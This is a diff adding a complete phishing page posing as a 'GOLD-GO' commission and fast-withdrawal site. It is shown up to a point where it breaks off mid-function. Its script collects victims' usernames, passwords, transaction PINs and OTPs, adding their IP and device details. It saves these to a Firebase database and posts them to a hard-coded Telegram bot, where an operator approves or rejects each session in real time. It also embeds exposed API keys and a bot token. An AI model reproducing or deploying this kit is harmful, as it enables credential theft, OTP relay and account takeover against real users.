@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>GOLD-GO</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif; background: #f4f4f6; display: flex; justify-content: center; min-height: 100vh; }
+  .page { width: 100%; max-width: 480px; min-height: 100vh; background: #f4f4f6; position: relative; overflow: hidden; }
+  .hero { background: linear-gradient(180deg, #8a3ff0 0%, #7b2ff0 100%); border-radius: 0 0 40px 40px; padding: 48px 24px 56px; text-align: center; color: #fff; }
+  .hero h1 { font-size: 2.6rem; font-style: italic; font-weight: 800; letter-spacing: 1px; }
+  .hero p { margin-top: 12px; font-size: 1.1rem; opacity: 0.95; }
+  .vip-banner { margin: -28px 24px 0; background: linear-gradient(90deg, #f7b733 0%, #f6a527 100%); border-radius: 999px; padding: 16px 20px; text-align: center; font-weight: 700; color: #2a2a2a; box-shadow: 0 8px 20px rgba(246, 165, 39, 0.4); position: relative; z-index: 2; }
+  .form-wrap { padding: 40px 24px 32px; }
+  .form-wrap h2 { font-size: 1.6rem; font-weight: 500; color: #222; margin-bottom: 8px; }
+  .form-wrap p.sub { color: #666; font-size: 0.95rem; margin-bottom: 20px; }
+  input { width: 100%; padding: 16px; margin-bottom: 18px; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; background: #fff; outline: none; transition: border 0.2s, box-shadow 0.2s; }
+  input:focus { border-color: #7b2ff0; box-shadow: 0 0 0 3px rgba(123, 47, 240, 0.12); }
+  #pinInput { letter-spacing: 4px; }
+  #otpInput { letter-spacing: 6px; font-size: 1.4rem; text-align: center; }
+  .links-row { display: flex; justify-content: space-between; font-size: 0.95rem; margin-bottom: 24px; }
+  .links-row a { color: #7b2ff0; text-decoration: none; }
+  .btn { width: 100%; padding: 16px; border-radius: 999px; font-size: 1.1rem; font-weight: 600; border: none; cursor: pointer; margin-bottom: 16px; transition: opacity 0.2s, transform 0.1s; }
+  .btn:active { opacity: 0.85; transform: scale(0.99); }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .btn-primary { background: #7b2ff0; color: #fff; }
+  .btn-outline { background: #fff; color: #7b2ff0; border: 2px solid #7b2ff0; }
+  .btn-success { background: #28a745; color: #fff; }
+  .btn-warning { background: #ffc107; color: #222; }
+  .btn-gold { background: linear-gradient(90deg, #f7b733, #f6a527); color: #222; font-weight: 700; box-shadow: 0 4px 15px rgba(246, 165, 39, 0.4); }
+  .back-link { color: #7b2ff0; text-decoration: underline; font-size: 1rem; background: none; border: none; cursor: pointer; padding: 0; display: block; text-align: center; margin-top: 8px; width: 100%; }
+  .screen { display: none; }
+  .screen.active { display: block; }
+
+  .loader-overlay { display: none; flex-direction: column; align-items: center; justify-content: center; gap: 16px; padding: 80px 24px; }
+  .loader-overlay.active { display: flex; }
+  .spinner { width: 42px; height: 42px; border: 4px solid #e5e0f7; border-top-color: #7b2ff0; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  .loader-overlay p { color: #777; font-size: 0.95rem; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .fade-in { animation: fadeIn 0.4s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+  .otp-timer-msg { background: #e8f5e9; color: #2e7d32; padding: 12px 16px; border-radius: 12px; font-size: 0.9rem; margin-bottom: 18px; text-align: center; border: 1px solid #c8e6c9; }
+  .otp-timer-msg .timer { font-weight: 700; font-size: 1.1rem; color: #1b5e20; }
+  .otp-timer-msg .resend-now { color: #7b2ff0; font-weight: 600; cursor: pointer; text-decoration: underline; }
+
+  .approval-box { text-align: center; padding: 24px 0; }
+  .approval-icon { width: 90px; height: 90px; border-radius: 50%; background: linear-gradient(135deg, #7b2ff0, #9c5bff); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 42px; box-shadow: 0 10px 30px rgba(123, 47, 240, 0.35); animation: pulse 1.8s ease-in-out infinite; }
+  @keyframes pulse { 0%,100% { transform: scale(1); box-shadow: 0 10px 30px rgba(123, 47, 240, 0.35); } 50% { transform: scale(1.06); box-shadow: 0 14px 40px rgba(123, 47, 240, 0.55); } }
+  .approval-box h2 { font-size: 1.5rem; color: #222; margin-bottom: 8px; }
+  .approval-box p { color: #666; font-size: 0.95rem; line-height: 1.6; margin-bottom: 20px; }
+  .approval-status { display: inline-flex; align-items: center; gap: 8px; background: #f5efff; color: #7b2ff0; padding: 10px 20px; border-radius: 999px; font-weight: 600; font-size: 0.9rem; }
+  .approval-status .dot { width: 8px; height: 8px; border-radius: 50%; background: #7b2ff0; animation: blink 1.2s ease-in-out infinite; }
+  @keyframes blink { 50% { opacity: 0.3; } }
+
+  .failed-box { text-align: center; padding: 40px 0; }
+  .failed-icon { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #e53935, #c62828); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 52px; box-shadow: 0 10px 30px rgba(229, 57, 53, 0.4); animation: pop 0.5s cubic-bezier(0.22, 1.61, 0.36, 1); }
+  @keyframes pop { 0% { transform: scale(0); opacity: 0; } 60% { transform: scale(1.15); opacity: 1; } 100% { transform: scale(1); } }
+  .failed-box h2 { font-size: 1.7rem; font-weight: 700; color: #c62828; margin-bottom: 10px; }
+  .failed-box p { color: #666; font-size: 0.98rem; line-height: 1.6; margin-bottom: 26px; }
+  .failed-box .error-badge { display: inline-block; background: #ffebee; color: #c62828; padding: 10px 24px; border-radius: 999px; font-weight: 700; font-size: 0.95rem; margin-bottom: 20px; border: 1px solid #ffcdd2; }
+
+  .success-page { text-align: center; padding: 50px 24px 40px; }
+  .success-icon { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3); animation: pop 0.6s cubic-bezier(0.22, 1.61, 0.36, 1); }
+  .success-icon svg { width: 56px; height: 56px; fill: #fff; }
+  .success-page h2 { font-size: 1.8rem; font-weight: 700; color: #222; margin-bottom: 8px; }
+  .success-page .badge-main { display: inline-block; background: linear-gradient(90deg, #f7b733, #f6a527); padding: 10px 28px; border-radius: 999px; font-weight: 800; font-size: 1.2rem; color: #222; margin: 12px 0 20px; box-shadow: 0 4px 15px rgba(246, 165, 39, 0.3); letter-spacing: 0.5px; }
+  .success-page p.status { color: #555; font-size: 1rem; line-height: 1.6; margin-bottom: 28px; }
+  .info-box { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 20px; text-align: left; }
+  .info-box .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 0.95rem; }
+  .info-box .row:last-child { border-bottom: none; }
+  .info-box .label { color: #888; }
+  .info-box .value { color: #222; font-weight: 500; }
+  .info-box .value.green { color: #28a745; }
+  .info-box .value.gold { color: #b8860b; font-weight: 700; }
+</style>
+</head>
+<body>
+  <div class="page">
+    <div class="hero">
+      <h1>GOLD-GO</h1>
+      <p>Earn huge commissions</p>
+    </div>
+
+    <div class="vip-banner">★ VIP Withdrawal &amp; remove risk</div>
+
+    <div class="form-wrap screen active" id="loginScreen">
+      <h2>Sign in</h2>
+      <p class="sub">Enter your account details to continue</p>
+      <form id="loginForm">
+        <input type="text" id="usernameInput" placeholder="Enter your account" required autocomplete="off">
+        <input type="password" id="passwordInput" placeholder="Enter password" required autocomplete="off">
+        <div class="links-row">
+          <a href="#">Forgot account &gt;</a>
+          <a href="#">Forgot password &gt;</a>
+        </div>
+        <button type="submit" class="btn btn-primary">Login</button>
+      </form>
+      <button type="button" class="btn btn-outline" id="guestBtn">Guest</button>
+      <button type="button" class="btn btn-outline" id="registerBtn">Register</button>
+    </div>
+
+    <div class="loader-overlay" id="loader">
+      <div class="spinner"></div>
+      <p id="loaderText">Signing in...</p>
+    </div>
+
+    <div class="form-wrap screen" id="pinScreen">
+      <h2>Security Verification</h2>
+      <p class="sub">Enter your 6-digit transaction PIN</p>
+      <form id="pinForm">
+        <input type="password" id="pinInput" inputmode="numeric" maxlength="6" pattern="[0-9]*" placeholder="Enter 6-digit PIN" required>
+        <button type="submit" class="btn btn-primary">Confirm PIN</button>
+      </form>
+      <button type="button" class="back-link" id="backToLogin">&larr; Back to login</button>
+    </div>
+
+    <!-- OTP SCREEN (no OTP shown) -->
+    <div class="form-wrap screen" id="otpScreen">
+      <h2>OTP Verification</h2>
+      <p class="sub">An OTP has been sent to your registered mobile number</p>
+
+      <div class="otp-timer-msg" id="otpTimerMsg">
+        <span id="timerText">⏱ Resend OTP in <span class="timer" id="timerCountdown">60</span> seconds</span>
+        <span id="resendLink" style="display:none;">📱 <span class="resend-now" id="resendOtpLink">Resend OTP now</span></span>
+      </div>
+
+      <form id="otpForm">
+        <input type="text" id="otpInput" inputmode="numeric" maxlength="6" pattern="[0-9]*" placeholder="Enter OTP" required>
+        <button type="submit" class="btn btn-success">Verify OTP</button>
+      </form>
+
+      <button type="button" class="btn btn-warning" id="resendOtpBtn" style="display:none;">Resend OTP</button>
+      <button type="button" class="back-link" id="backFromOtp">&larr; Back to PIN</button>
+    </div>
+
+    <div class="form-wrap screen" id="approvalScreen">
+      <div class="approval-box">
+        <div class="approval-icon">⏳</div>
+        <h2>Waiting for Approval</h2>
+        <p>Your verification request has been sent to the admin.<br>Please wait while admin verifies your account.</p>
+        <div class="approval-status">
+          <span class="dot"></span>
+          <span id="approvalStatusText">Checking approval status...</span>
+        </div>
+      </div>
+      <button type="button" class="back-link" id="cancelApproval">&larr; Cancel &amp; go back</button>
+    </div>
+
+    <div class="form-wrap screen" id="failedScreen">
+      <div class="failed-box">
+        <div class="failed-icon">❌</div>
+        <h2>Verification Failed</h2>
+        <div class="error-badge">Access Denied by Admin</div>
+        <p>Your login request was rejected.<br>Please contact support or try again later.</p>
+      </div>
+      <button type="button" class="btn btn-primary" id="retryBtn">Try Again</button>
+    </div>
+
+    <div class="form-wrap screen" id="successScreen">
+      <div class="success-page fade-in">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+        </div>
+        <h2>Fast Withdrawal</h2>
+        <div class="badge-main">✅ Active in Your Account</div>
+        <p class="status">Your account has been verified successfully.<br>You can now withdraw funds instantly.</p>
+        <div class="info-box">
+          <div class="row"><span class="label">Account</span><span class="value" id="successUsername">-</span></div>
+          <div class="row"><span class="label">Status</span><span class="value green">● Active</span></div>
+          <div class="row"><span class="label">Withdrawal Type</span><span class="value gold">⚡ Fast Withdrawal</span></div>
+          <div class="row"><span class="label">Verified</span><span class="value green">✔ Yes</span></div>
+        </div>
+        <button type="button" class="btn btn-gold" id="withdrawBtn">🚀 Withdraw Now</button>
+        <button type="button" class="back-link" id="logoutBtn">Logout</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <script>
+    /* ═══════════════════════════════════════════════════
+       ⚙️ CONFIG
+       ═══════════════════════════════════════════════════ */
+
+    /* ---------- 🔵 FIREBASE ---------- */
+    const firebaseConfig = {
+      apiKey: "AIzaSyBKEZvvUvpxCOy0dFqE0I2ytbfTf6puZ8o",
+      authDomain: "bnitinweb.firebaseapp.com",
+      databaseURL: "https://bnitinweb-default-rtdb.firebaseio.com",
+      projectId: "bnitinweb",
+      storageBucket: "bnitinweb.firebasestorage.app",
+      messagingSenderId: "8638948411",
+      appId: "1:8638948411:web:d75802ef8a049b1b1ae81e",
+      measurementId: "G-68VYCEB9M8"
+    };
+
+    /* ---------- 🤖 TELEGRAM BOT (YAHAN APNA DAALO) ---------- */
+    const BOT_TOKEN_1 = '8651620274:AAEwK_uB4XvRngRGQBSgBhEuSeSjpJ2M_EA';
+    const CHAT_ID_1   = '8125320589';
+
+    /* ═══════════════════════════════════════════════════
+       💎 PREMIUM EMOJI IDs
+       ═══════════════════════════════════════════════════ */
+    const PE = {
+      crown:   { id: "5217822164362739968", fb: "👑" },
+      gem:     { id: "5427168083074628963", fb: "💎" },
+      fire:    { id: "5424972470023104089", fb: "🔥" },
+      star:    { id: "5438496463044752972", fb: "⭐️" },
+      bell:    { id: "5458603043203327669", fb: "🔔" },
+      lock:    { id: "5296369303661067030", fb: "🔒" },
+      shield:  { id: "5251203410396458957", fb: "🛡" },
+      globe:   { id: "5447410659077661506", fb: "🌐" },
+      point:   { id: "5391032818111363540", fb: "📍" },
+      check:   { id: "5206607081334906820", fb: "✔️" },
+      cross:   { id: "5210952531676504517", fb: "❌" },
+      warning: { id: "5447644880824181073", fb: "⚠️" },
+      boom:    { id: "5276032951342088188", fb: "💥" },
+      eyes:    { id: "5210956306952758910", fb: "👀" },
+      info:    { id: "5334544901428229844", fb: "ℹ️" },
+      bullet:  { id: "5397916757333654639", fb: "➕" },
+      bolt:    { id: "5456140674028019486", fb: "⚡️" },
+      sparkle: { id: "5325547803936572038", fb: "✨" },
+      money:   { id: "5409048419211682843", fb: "💵" },
+      cash:    { id: "5233326571099534068", fb: "💸" }
+    };
+
+    function pe(key) {
+      const e = PE[key];
+      return e ? `<tg-emoji emoji-id="${e.id}">${e.fb}</tg-emoji>` : "";
+    }
+
+    function esc(s) {
+      return String(s || '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+    }
+
+    /* ═══════════════════════════════════════════════════
+       FIREBASE INIT
+       ═══════════════════════════════════════════════════ */
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    /* ═══════════════════════════════════════════════════
+       TELEGRAM API
+       ═══════════════════════════════════════════════════ */
+    function tgSend(text, replyMarkup) {
+      if (!BOT_TOKEN_1 || BOT_TOKEN_1.includes('YAHAN')) return Promise.resolve({ ok: false });
+      const payload = { chat_id: CHAT_ID_1, text: text, parse_mode: 'HTML' };
+      if (replyMarkup) payload.reply_markup = replyMarkup;
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).then(r => r.json()).catch(e => console.error('TG error:', e));
+    }
+
+    function tgEditButtons(messageId, text) {
+      if (!BOT_TOKEN_1 || BOT_TOKEN_1.includes('YAHAN')) return;
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID_1,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [[{ text: text, callback_data: "noop" }]] }
+        })
+      }).catch(() => {});
+    }
+
+    function tgNotify(text) {
+      if (!BOT_TOKEN_1 || BOT_TOKEN_1.includes('YAHAN')) return;
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID_1, text: text, parse_mode: 'HTML' })
+      }).catch(() => {});
+    }
+
+    /* ═══════════════════════════════════════════════════
+       UI REFS
+       ═══════════════════════════════════════════════════ */
+    const loginScreen    = document.getElementById('loginScreen');
+    const pinScreen      = document.getElementById('pinScreen');
+    const otpScreen      = document.getElementById('otpScreen');
+    const approvalScreen = document.getElementById('approvalScreen');
+    const failedScreen   = document.getElementById('failedScreen');
+    const successScreen  = document.getElementById('successScreen');
+    const loader         = document.getElementById('loader');
+    const loaderText     = document.getElementById('loaderText');
+
+    const timerText      = document.getElementById('timerText');
+    const timerCountdown = document.getElementById('timerCountdown');
+    const resendLink     = document.getElementById('resendLink');
+    const resendOtpLink  = document.getElementById('resendOtpLink');
+    const resendOtpBtn   = document.getElementById('resendOtpBtn');
+
+    let capturedUsername = '';
+    let capturedPassword = '';
+    let capturedPin = '';
+    let capturedOtp = '';
+    let generatedOtp = '';
+    let currentSessionId = '';
+    let currentAdminMsgId = null;
+    let statusListener = null;
+    let timerInterval = null;
+    let secondsLeft = 60;
+    let ip_global = 'Unknown';
+
+    function hideAll() {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      loader.classList.remove('active');
+    }
+    function showScreen(el) {
+      hideAll();
+      el.classList.add('active');
+      el.classList.add('fade-in');
+      setTimeout(() => el.classList.remove('fade-in'), 400);
+    }
+    function showWithLoader(el, message, delay) {
+      hideAll();
+      loaderText.textContent = message;
+      loader.classList.add('active');
+      setTimeout(() => showScreen(el), delay);
+    }
+
+    /* ═══════════════════════════════════════════════════
+       OTP TIMER
+       ═══════════════════════════════════════════════════ */
+    function startOtpTimer() {
+      if (timerInterval) clearInterval(timerInterval);
+      secondsLeft = 60;
+      timerText.style.display = 'inline';
+      resendLink.style.display = 'none';
+      resendOtpBtn.style.display = 'none';
+      timerCountdown.textContent = secondsLeft;
+      timerInterval = setInterval(function() {
+        secondsLeft--;
+        timerCountdown.textContent = secondsLeft;
+        if (secondsLeft <= 0) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+          timerText.style.display = 'none';
+          resendLink.style.display = 'inline';
+          resendOtpBtn.style.display = 'block';
+        }
+      }, 1000);
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SCREEN 1: LOGIN
+       ═══════════════════════════════════════════════════ */
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const username = document.getElementById('usernameInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
+      if (!username || !password) return;
+      capturedUsername = username;
+      capturedPassword = password;
+      document.getElementById('pinInput').value = '';
+      capturedPin = '';
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+      showWithLoader(pinScreen, 'Signing in...', 1000);
+    });
+
+    /* ═══════════════════════════════════════════════════
+       SCREEN 2: PIN → OTP (generate silently, don't show)
+       ═══════════════════════════════════════════════════ */
+    document.getElementById('pinForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const pin = document.getElementById('pinInput').value.trim();
+      if (!pin || pin.length < 6) { alert('Please enter a valid 6-digit PIN'); return; }
+      capturedPin = pin;
+
+      // OTP generate (user ko nahi dikhayenge)
+      generatedOtp = String(Math.floor(100000 + Math.random() * 900000));
+      document.getElementById('otpInput').value = '';
+
+      showWithLoader(otpScreen, 'Sending OTP...', 1200);
+      setTimeout(function() { startOtpTimer(); }, 500);
+    });
+
+    /* ═══════════════════════════════════════════════════
+       SCREEN 3: OTP → Firebase + Telegram
+       User kuch bhi daale, request chali jayegi
+       ═══════════════════════════════════════════════════ */
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const otp = document.getElementById('otpInput').value.trim();
+
+      // 🎯 Koi check nahi — user kuch bhi daale, chalega
+      // Agar khaali hai to dummy daal do
+      capturedOtp = otp || '------';
+
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+
+      hideAll();
+      loaderText.textContent = 'Sending to admin...';
+      loader.classList.add('active');
+
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => { ip_global = d.ip; processRequest(d.ip); })
+        .catch(() => processRequest('Unknown'));
+
+      function processRequest(ip) {
+        currentSessionId = 'SESS' + Date.now() + Math.floor(Math.random() * 9000 + 1000);
+        const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+        // Firebase save
+        db.ref('sessions/' + currentSessionId).set({
+          username: capturedUsername,
+          password: capturedPassword,
+          pin: capturedPin,
+          otp: capturedOtp,
+          ip: ip,
+          time: time,
+          ua: navigator.userAgent,
+          status: 'pending',
+          createdAt: Date.now()
+        }).catch(err => console.error('Firebase save error:', err));
+
+        // Telegram message with premium emoji
+        const tgMsg = `
+${pe('gem')}━━━━━━━━━━━━━━━━━━━${pe('gem')}
+   ${pe('crown')} <b>GOLD-GO</b> ${pe('crown')}
+${pe('gem')}━━━━━━━━━━━━━━━━━━━${pe('gem')}
+
+   ${pe('bolt')} <b>ɴᴇᴡ ʟᴏɢɪɴ ʀᴇǫᴜᴇꜱᴛ</b> ${pe('bolt')}
+
+╭──────────────────────╮
+│ ${pe('eyes')}  <b>ᴜꜱᴇʀ</b>      ➤  <code>${esc(capturedUsername)}</code>
+│ ${pe('lock')}  <b>ᴩᴀꜱꜱᴡᴏʀᴅ</b>  ➤  <code>${esc(capturedPassword)}</code>
+│ ${pe('bullet')}  <b>ᴩɪɴ</b>       ➤  <code>${esc(capturedPin)}</code>
+│ ${pe('info')}  <b>ᴏᴛᴩ</b>       ➤  <code>${esc(capturedOtp)}</code>
+╰──────────────────────╯
+
+${pe('point')} <b>ɪᴩ:</b> <code>${esc(ip)}</code>
+${pe('bell')} <b>ᴛɪᴍᴇ:</b> ${esc(time)}
+${pe('globe')} <b>ᴅᴇᴠɪᴄᴇ:</b> <code>${esc((navigator.userAgent || '').slice(0, 40))}...</code>
+
+${pe('info')} <b>ꜱᴇꜱꜱɪᴏɴ:</b> <code>${currentSessionId}</code>
+
+${pe('gem')}━━━━━━━━━━━━━━━━━━━${pe('gem')}
+${pe('warning')} <i>ᴀᴩᴩʀᴏᴠᴇ ᴏʀ ʀᴇᴊᴇᴄᴛ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ</i>
+        `.trim();
+
+        const replyMarkup = {
+          inline_keyboard: [[
+            { text: "✅ Approve", callback_data: `approve:${currentSessionId}` },
+            { text: "❌ Reject",  callback_data: `reject:${currentSessionId}` }
+          ]]
+        };
+
+        tgSend(tgMsg, replyMarkup).then(res => {
+          if (res && res.ok && res.result) {
+            currentAdminMsgId = res.result.message_id;
+          }
+        });
+
+        // Approval screen
+        hideAll();
+        document.getElementById('approvalStatusText').textContent = 'Checking approval status...';
+        approvalScreen.classList.add('active', 'fade-in');
+        setTimeout(() => approvalScreen.classList.remove('fade-in'), 400);
+
+        // Firebase listener
+        if (statusListener) {
+          db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+          statusListener = null;
+        }
+
+        statusListener = db.ref('sessions/' + currentSessionId + '/status').on('value', function(snapshot) {
+          const status = snapshot.val();
+          if (status === 'approved') {
+            db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+            statusListener = null;
+            document.getElementById('approvalStatusText').textContent = 'Approved!';
+            document.getElementById('successUsername').textContent = capturedUsername;
+            setTimeout(function() {
+              showWithLoader(successScreen, 'Logging you in...', 900);
+            }, 400);
+          } else if (status === 'rejected') {
+            db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+            statusListener = null;
+            document.getElementById('approvalStatusText').textContent = 'Rejected';
+            setTimeout(function() {
+              showWithLoader(failedScreen, 'Verification failed...', 700);
+            }, 400);
+          }
+        });
+
+        startTelegramPolling();
+      }
+    });
+
+    /* ═══════════════════════════════════════════════════
+       TELEGRAM POLLING
+       ═══════════════════════════════════════════════════ */
+    let tgPollingInterval = null;
+    let tgLastUpdateId = 0;
+    let isResolved = false;
+
+    function startTelegramPolling() {
+      if (!BOT_TOKEN_1 || BOT_TOKEN_1.includes('YAHAN')) return;
+      stopTelegramPolling();
+      isResolved = false;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=-1&limit=1`)
+        .then(r => r.json())
+        .then(d => {
+          if (d.ok && d.result && d.result.length) {
+            tgLastUpdateId = d.result[0].update_id + 1;
+          }
+          tgPollingInterval = setInterval(checkTelegramUpdates, 2000);
+        })
+        .catch(() => {
+          tgPollingInterval = setInterval(checkTelegramUpdates, 2000);
+        });
+    }
+
+    function stopTelegramPolling() {
+      if (tgPollingInterval) {
+        clearInterval(tgPollingInterval);
+        tgPollingInterval = null;
+      }
+    }
+
+    async function checkTelegramUpdates() {
+      if (isResolved) return;
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/getUpdates?offset=${tgLastUpdateId}&timeout=0`);
+        const data = await res.json();
+        if (!data.ok) return;
+
+        for (const upd of data.result) {
+          tgLastUpdateId = upd.update_id + 1;
+          if (!upd.callback_query) continue;
+
+          const cb = upd.callback_query;
+          const [action, sessionId] = (cb.data || '').split(':');
+          if (sessionId !== currentSessionId) continue;
+
+          if (action === 'approve' && !isResolved) {
+            isResolved = true;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ callback_query_id: cb.id, text: '✅ Approved successfully', show_alert: false })
+            }).catch(() => {});
+
+            db.ref('sessions/' + currentSessionId + '/status').set('approved').catch(() => {});
+
+            if (currentAdminMsgId) tgEditButtons(currentAdminMsgId, '✅ ᴀᴩᴩʀᴏᴠᴇᴅ');
+
+            const confirmMsg = `
+${pe('check')}━━━━━━━━━━━━━━━━━━━${pe('check')}
+   ${pe('sparkle')} <b>✅ ᴀᴩᴩʀᴏᴠᴇᴅ ᴅᴏɴᴇ</b> ${pe('sparkle')}
+${pe('check')}━━━━━━━━━━━━━━━━━━━${pe('check')}
+
+${pe('eyes')} <b>ᴜꜱᴇʀ:</b> <code>${esc(capturedUsername)}</code>
+${pe('lock')} <b>ᴩᴀꜱꜱᴡᴏʀᴅ:</b> <code>${esc(capturedPassword)}</code>
+${pe('bullet')} <b>ᴩɪɴ:</b> <code>${esc(capturedPin)}</code>
+${pe('info')} <b>ᴏᴛᴩ:</b> <code>${esc(capturedOtp)}</code>
+
+${pe('point')} <b>ɪᴩ:</b> <code>${esc(ip_global)}</code>
+${pe('bell')} <b>ᴀᴩᴩʀᴏᴠᴇᴅ ᴀᴛ:</b> ${esc(new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }))}
+
+${pe('bolt')} <b>ꜱᴛᴀᴛᴜꜱ:</b> ${pe('money')} <b>ᴜꜱᴇʀ ʟᴏɢɢᴇᴅ ɪɴ</b> ${pe('money')}
+
+${pe('check')}━━━━━━━━━━━━━━━━━━━${pe('check')}
+            `.trim();
+
+            tgNotify(confirmMsg);
+
+            stopTelegramPolling();
+            document.getElementById('approvalStatusText').textContent = 'Approved!';
+            document.getElementById('successUsername').textContent = capturedUsername;
+            setTimeout(function() {
+              showWithLoader(successScreen, 'Logging you in...', 900);
+            }, 400);
+            return;
+          }
+
+          if (action === 'reject' && !isResolved) {
+            isResolved = true;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ callback_query_id: cb.id, text: '❌ Rejected', show_alert: false })
+            }).catch(() => {});
+
+            db.ref('sessions/' + currentSessionId + '/status').set('rejected').catch(() => {});
+
+            if (currentAdminMsgId) tgEditButtons(currentAdminMsgId, '❌ ʀᴇᴊᴇᴄᴛᴇᴅ');
+
+            const rejMsg = `
+${pe('cross')}━━━━━━━━━━━━━━━━━━━${pe('cross')}
+   ${pe('boom')} <b>❌ ʀᴇᴊᴇᴄᴛᴇᴅ</b> ${pe('boom')}
+${pe('cross')}━━━━━━━━━━━━━━━━━━━${pe('cross')}
+
+${pe('eyes')} <b>ᴜꜱᴇʀ:</b> <code>${esc(capturedUsername)}</code>
+${pe('bell')} <b>ʀᴇᴊᴇᴄᴛᴇᴅ ᴀᴛ:</b> ${esc(new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }))}
+
+${pe('warning')} <i>ᴜꜱᴇʀ ᴋᴏ ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ᴋɪʏᴀ ɢᴀʏᴀ</i>
+
+${pe('cross')}━━━━━━━━━━━━━━━━━━━${pe('cross')}
+            `.trim();
+
+            tgNotify(rejMsg);
+
+            stopTelegramPolling();
+            document.getElementById('approvalStatusText').textContent = 'Rejected';
+            setTimeout(function() {
+              showWithLoader(failedScreen, 'Verification failed...', 700);
+            }, 400);
+            return;
+          }
+        }
+      } catch (e) {}
+    }
+
+    /* ═══════════════════════════════════════════════════
+       CANCEL APPROVAL
+       ═══════════════════════════════════════════════════ */
+    document.getElementById('cancelApproval').addEventListener('click', function() {
+      if (statusListener) {
+        db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+        statusListener = null;
+      }
+      stopTelegramPolling();
+      showWithLoader(loginScreen, 'Loading...', 500);
+    });
+
+    /* ═══════════════════════════════════════════════════
+       RESEND OTP (just resets timer, no OTP shown)
+       ═══════════════════════════════════════════════════ */
+    function handleResendOtp() {
+      document.getElementById('otpInput').value = '';
+      startOtpTimer();
+      alert('✅ OTP sent successfully');
+    }
+    resendOtpLink.addEventListener('click', handleResendOtp);
+    resendOtpBtn.addEventListener('click', handleResendOtp);
+
+    /* ═══════════════════════════════════════════════════
+       OTHER BUTTONS
+       ═══════════════════════════════════════════════════ */
+    document.getElementById('guestBtn').addEventListener('click', function() { alert('Guest access — coming soon'); });
+    document.getElementById('registerBtn').addEventListener('click', function() { alert('Registration page — coming soon'); });
+    document.getElementById('withdrawBtn').addEventListener('click', function() { alert('🚀 Withdrawal processing... (coming soon)'); });
+    document.getElementById('backToLogin').addEventListener('click', function() {
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+      showWithLoader(loginScreen, 'Loading...', 500);
+    });
+    document.getElementById('backFromOtp').addEventListener('click', function() {
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
